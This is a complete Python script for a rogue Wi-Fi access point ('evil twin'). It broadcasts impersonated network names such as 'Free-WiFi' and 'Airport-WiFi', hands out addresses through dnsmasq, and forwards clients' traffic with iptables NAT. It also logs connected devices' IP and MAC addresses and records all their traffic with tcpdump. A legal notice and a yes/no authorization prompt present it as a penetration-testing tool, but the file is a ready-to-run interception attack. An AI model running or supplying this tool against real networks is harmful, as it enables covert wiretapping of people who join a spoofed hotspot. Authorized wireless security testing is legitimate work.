#!/usr/bin/env python3
"""
SSID Capturer - Rogue Access Point with Traffic Capture
Creates fake access points from SSID list and captures data from connecting clients
For authorized penetration testing and security research only
"""

import sys
import os
import argparse
import subprocess
import signal
import time
from datetime import datetime
from pathlib import Path
import threading
import shutil

class SSIDCapturer:
    def __init__(self, interface, ssid_file, output_dir, channel=6,
                 encryption=None, password=None, internet_share=False,
                 upstream_interface=None):
        self.interface = interface
        self.ssid_file = ssid_file
        self.output_dir = Path(output_dir)
        self.channel = channel
        self.encryption = encryption
        self.password = password
        self.internet_share = internet_share
        self.upstream_interface = upstream_interface
        self.ssids = []
        self.current_ssid = None
        self.processes = []
        self.capture_process = None

        # Create output directory
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.log_file = self.output_dir / "capture_log.txt"
        self.clients_file = self.output_dir / "connected_clients.txt"

    def log(self, message):
        """Log message to file and console"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)

        with open(self.log_file, 'a') as f:
            f.write(log_msg + "\n")

    def check_dependencies(self):
        """Check if required tools are installed"""
        required = ['hostapd', 'dnsmasq', 'tcpdump', 'iptables']
        missing = []

        for tool in required:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            print("[!] Missing required tools:")
            for tool in missing:
                print(f"    - {tool}")
            print("\n[!] Install with: sudo apt-get install " + " ".join(missing))
            return False

        return True

    def load_ssids(self):
        """Load SSIDs from text file"""
        try:
            with open(self.ssid_file, 'r', encoding='utf-8') as f:
                self.ssids = [line.strip() for line in f
                             if line.strip() and not line.startswith('#')]

            if not self.ssids:
                print("[!] No SSIDs found in file")
                return False

            self.log(f"Loaded {len(self.ssids)} SSIDs from {self.ssid_file}")
            return True

        except FileNotFoundError:
            print(f"[!] Error: File '{self.ssid_file}' not found")
            return False
        except Exception as e:
            print(f"[!] Error loading SSIDs: {e}")
            return False

    def create_hostapd_config(self, ssid):
        """Create hostapd configuration file"""
        config_file = self.output_dir / "hostapd.conf"

        config = f"""# Hostapd configuration
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""

        # Add encryption if specified
        if self.encryption == 'wpa2' and self.password:
            config += f"""
# WPA2 Configuration
auth_algs=1
wpa=2
wpa_passphrase={self.password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        elif self.encryption == 'wep' and self.password:
            config += f"""
# WEP Configuration (legacy)
auth_algs=3
wep_default_key=0
wep_key0="{self.password}"
"""
        # Otherwise, open network (no encryption)

        with open(config_file, 'w') as f:
            f.write(config)

        return config_file

    def create_dnsmasq_config(self):
        """Create dnsmasq configuration for DHCP"""
        config_file = self.output_dir / "dnsmasq.conf"

        config = f"""# DNSMASQ configuration
interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
bind-interfaces
"""

        with open(config_file, 'w') as f:
            f.write(config)

        return config_file

    def setup_interface(self):
        """Configure network interface"""
        self.log(f"Configuring interface {self.interface}")

        try:
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                          check=True, capture_output=True)

            # Set IP address
            subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                          check=True, capture_output=True)
            subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.interface],
                          check=True, capture_output=True)

            # Bring interface up
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                          check=True, capture_output=True)

            self.log("Interface configured successfully")
            return True

        except subprocess.CalledProcessError as e:
            self.log(f"Error configuring interface: {e}")
            return False

    def setup_internet_sharing(self):
        """Setup internet forwarding (NAT)"""
        if not self.internet_share or not self.upstream_interface:
            return True

        self.log(f"Setting up internet sharing via {self.upstream_interface}")

        try:
            # Enable IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                          check=True, capture_output=True)

            # Setup NAT
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING',
                          '-o', self.upstream_interface, '-j', 'MASQUERADE'],
                          check=True, capture_output=True)

            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.interface,
                          '-o', self.upstream_interface, '-j', 'ACCEPT'],
                          check=True, capture_output=True)

            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.upstream_interface,
                          '-o', self.interface, '-m', 'state', '--state',
                          'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
                          check=True, capture_output=True)

            self.log("Internet sharing enabled")
            return True

        except subprocess.CalledProcessError as e:
            self.log(f"Error setting up internet sharing: {e}")
            return False

    def cleanup_internet_sharing(self):
        """Remove internet forwarding rules"""
        if not self.internet_share or not self.upstream_interface:
            return

        try:
            subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING',
                          '-o', self.upstream_interface, '-j', 'MASQUERADE'],
                          capture_output=True)
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.interface,
                          '-o', self.upstream_interface, '-j', 'ACCEPT'],
                          capture_output=True)
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.upstream_interface,
                          '-o', self.interface, '-m', 'state', '--state',
                          'RELATED,ESTABLISHED', '-j', 'ACCEPT'],
                          capture_output=True)
        except (subprocess.CalledProcessError, FileNotFoundError, Exception):
            pass

    def start_packet_capture(self, ssid):
        """Start tcpdump to capture traffic"""
        pcap_file = self.output_dir / f"capture_{ssid.replace(' ', '_')}_{int(time.time())}.pcap"

        cmd = ['tcpdump', '-i', self.interface, '-w', str(pcap_file), '-U']

        try:
            self.capture_process = subprocess.Popen(cmd,
                                                    stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE)
            self.log(f"Packet capture started: {pcap_file}")
            return True
        except Exception as e:
            self.log(f"Error starting packet capture: {e}")
            return False

    def stop_packet_capture(self):
        """Stop packet capture"""
        if self.capture_process:
            self.capture_process.terminate()
            try:
                self.capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.capture_process.kill()
            self.log("Packet capture stopped")

    def monitor_clients(self):
        """Monitor and log connected clients"""
        while True:
            try:
                # Get ARP table
                result = subprocess.run(['ip', 'neigh', 'show', 'dev', self.interface],
                                      capture_output=True, text=True)

                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    active_clients = []

                    for line in lines:
                        parts = line.split()
                        if len(parts) >= 5:
                            ip = parts[0]
                            mac = parts[4] if parts[3] == 'lladdr' else 'unknown'
                            active_clients.append(f"{ip} - {mac}")

                    if active_clients:
                        with open(self.clients_file, 'a') as f:
                            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                            f.write(f"\n[{timestamp}] SSID: {self.current_ssid}\n")
                            for client in active_clients:
                                f.write(f"  {client}\n")

                time.sleep(10)  # Check every 10 seconds

            except Exception as e:
                self.log(f"Error monitoring clients: {e}")
                time.sleep(10)

    def start_access_point(self, ssid):
        """Start rogue access point for given SSID"""
        self.current_ssid = ssid
        self.log(f"\n{'='*60}")
        self.log(f"Starting access point for SSID: {ssid}")
        self.log(f"{'='*60}")

        # Create configurations
        hostapd_conf = self.create_hostapd_config(ssid)
        dnsmasq_conf = self.create_dnsmasq_config()

        # Setup interface
        if not self.setup_interface():
            return False

        # Setup internet sharing if requested
        if not self.setup_internet_sharing():
            return False

        # Start hostapd
        self.log("Starting hostapd...")
        hostapd_cmd = ['hostapd', str(hostapd_conf)]
        try:
            hostapd_proc = subprocess.Popen(hostapd_cmd,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.STDOUT)
            self.processes.append(hostapd_proc)
            time.sleep(2)  # Let hostapd start

            if hostapd_proc.poll() is not None:
                self.log("Error: hostapd failed to start")
                return False

        except Exception as e:
            self.log(f"Error starting hostapd: {e}")
            return False

        # Start dnsmasq
        self.log("Starting DHCP server...")
        dnsmasq_cmd = ['dnsmasq', '-C', str(dnsmasq_conf), '-d']
        try:
            dnsmasq_proc = subprocess.Popen(dnsmasq_cmd,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.STDOUT)
            self.processes.append(dnsmasq_proc)
            time.sleep(1)

        except Exception as e:
            self.log(f"Error starting dnsmasq: {e}")
            return False

        # Start packet capture
        self.start_packet_capture(ssid)

        # Start client monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_clients, daemon=True)
        monitor_thread.start()

        self.log(f"Access point active - waiting for connections...")
        self.log(f"Channel: {self.channel}")
        self.log(f"Encryption: {self.encryption if self.encryption else 'Open (None)'}")
        self.log(f"Internet sharing: {'Enabled' if self.internet_share else 'Disabled'}")

        return True

    def cleanup(self):
        """Clean up all processes and configurations"""
        self.log("\nCleaning up...")

        # Stop packet capture
        self.stop_packet_capture()

        # Kill all subprocesses
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
            except (ProcessLookupError, Exception):
                pass

        # Cleanup internet sharing
        self.cleanup_internet_sharing()

        # Kill any remaining hostapd/dnsmasq
        subprocess.run(['killall', 'hostapd'], capture_output=True)
        subprocess.run(['killall', 'dnsmasq'], capture_output=True)

        self.log("Cleanup complete")

    def run_single_ssid(self, ssid, duration):
        """Run single SSID for specified duration"""
        if self.start_access_point(ssid):
            try:
                self.log(f"Running for {duration} seconds... (Press Ctrl+C to stop)")
                time.sleep(duration)
            except KeyboardInterrupt:
                self.log("Interrupted by user")

    def run_rotation(self, duration_per_ssid):
        """Rotate through all SSIDs"""
        self.log(f"Starting SSID rotation ({duration_per_ssid}s per SSID)")

        try:
            for ssid in self.ssids:
                self.run_single_ssid(ssid, duration_per_ssid)
                self.cleanup()
                time.sleep(2)  # Brief pause between SSIDs

        except KeyboardInterrupt:
            self.log("Rotation interrupted by user")

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n[!] Interrupted - cleaning up...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="SSID Capturer - Rogue AP with Traffic Capture",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single open SSID, 5 minute capture
  sudo python3 ssid_capturer.py -i wlan0 -f ssids.txt -s "Free-WiFi" -d 300

  # Rotate through SSIDs, 2 minutes each
  sudo python3 ssid_capturer.py -i wlan0 -f ssids.txt -r -d 120

  # WPA2 protected SSID with internet sharing
  sudo python3 ssid_capturer.py -i wlan0 -f ssids.txt -s "CoffeeShop" \\
      -e wpa2 -p "password123" --internet -u eth0

  # Open network with internet sharing
  sudo python3 ssid_capturer.py -i wlan0 -f ssids.txt -s "Airport-WiFi" \\
      --internet -u eth0 -d 600

IMPORTANT LEGAL NOTICE:
  This tool creates rogue access points and captures network traffic.
  Only use on networks you own or have explicit written authorization to test.
  Unauthorized use may violate:
  - Computer Fraud and Abuse Act (US)
  - Wiretap Act
  - Similar laws in other jurisdictions

  Always obtain proper authorization before use.
        """
    )

    parser.add_argument('-i', '--interface', required=True,
                       help='Wireless interface to use (will be configured)')
    parser.add_argument('-f', '--file', required=True,
                       help='Text file containing SSIDs')
    parser.add_argument('-s', '--ssid',
                       help='Specific SSID to use (if not rotating)')
    parser.add_argument('-r', '--rotate', action='store_true',
                       help='Rotate through all SSIDs in file')
    parser.add_argument('-d', '--duration', type=int, default=300,
                       help='Duration in seconds (per SSID if rotating, default: 300)')
    parser.add_argument('-o', '--output', default='./captures',
                       help='Output directory for captures (default: ./captures)')
    parser.add_argument('-ch', '--channel', type=int, default=6,
                       help='WiFi channel (default: 6)')
    parser.add_argument('-e', '--encryption', choices=['wpa2', 'wep'],
                       help='Encryption type (default: open/none)')
    parser.add_argument('-p', '--password',
                       help='Password for encrypted network')
    parser.add_argument('--internet', action='store_true',
                       help='Share internet connection (requires -u)')
    parser.add_argument('-u', '--upstream',
                       help='Upstream interface for internet sharing (e.g., eth0)')

    args = parser.parse_args()

    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This script must be run as root (use sudo)")
        sys.exit(1)

    # Validate arguments
    if args.encryption and not args.password:
        print("[!] Password required when using encryption")
        sys.exit(1)

    if args.internet and not args.upstream:
        print("[!] Upstream interface required for internet sharing (use -u)")
        sys.exit(1)

    if not args.ssid and not args.rotate:
        print("[!] Must specify either --ssid or --rotate")
        sys.exit(1)

    # Setup signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Create capturer
    capturer = SSIDCapturer(
        interface=args.interface,
        ssid_file=args.file,
        output_dir=args.output,
        channel=args.channel,
        encryption=args.encryption,
        password=args.password,
        internet_share=args.internet,
        upstream_interface=args.upstream
    )

    # Check dependencies
    if not capturer.check_dependencies():
        sys.exit(1)

    # Load SSIDs
    if not capturer.load_ssids():
        sys.exit(1)

    print("\n" + "="*70)
    print("WARNING: AUTHORIZED USE ONLY")
    print("="*70)
    print("This tool creates rogue access points and captures network traffic.")
    print("Only use on networks you own or have written authorization to test.")
    print("="*70)
    response = input("\nDo you have authorization to proceed? (yes/no): ")

    if response.lower() != 'yes':
        print("[!] Authorization not confirmed. Exiting.")
        sys.exit(0)

    try:
        if args.rotate:
            capturer.run_rotation(args.duration)
        else:
            if args.ssid not in capturer.ssids:
                print(f"[!] Warning: SSID '{args.ssid}' not in file, using anyway")
                capturer.ssids = [args.ssid]

            capturer.run_single_ssid(args.ssid, args.duration)

    finally:
        capturer.cleanup()
        print("\n[+] Capture complete. Check output directory:")
        print(f"    {os.path.abspath(args.output)}")

if __name__ == "__main__":
    main()
